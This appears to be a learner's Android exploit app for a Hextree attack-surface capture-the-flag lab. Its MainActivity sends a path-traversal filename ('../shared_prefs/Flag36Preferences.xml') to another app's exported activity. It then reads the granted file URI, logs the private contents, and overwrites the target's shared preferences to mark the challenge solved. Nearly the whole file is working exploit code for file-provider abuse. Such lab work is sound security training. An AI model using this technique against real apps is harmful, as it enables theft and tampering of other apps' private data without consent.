package io.hextree.fileprovider;

import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        findViewById(R.id.button).setOnClickListener(v -> {
            Intent intent = new Intent();
            Log.i("FLAG34", "Starting intent");
            intent.setComponent( new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity"));
            //intent.putExtra("filename", "../flag35.txt");
            intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml" );
            Log.i("FLAG34", "Sending intent");
            startActivityForResult(intent, 42);
        });

    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        Utils.showDialog(this, data);
        super .onActivityResult(requestCode, resultCode, data);
        Log.i("FLAG34", "onActivityResult");
        Log.i("FLAG34", "URI = " + data.getData());
        try {
            InputStream inputstream = getContentResolver().openInputStream(data.getData());
            byte[] buffer = new byte[inputstream.available()];
            inputstream.read(buffer);
            Log.d("FLAG34", new String(buffer));
        } catch (Exception e) {
            e.printStackTrace();
        }
        // Write to shared preferences
        /*
            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
            <map>
                <boolean name="solved" value="true" />
            </map>
        * */
        try {
            OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
            outputStream.write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <boolean name=\"solved\" value=\"true\" />\n</map>\n".getBytes());
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}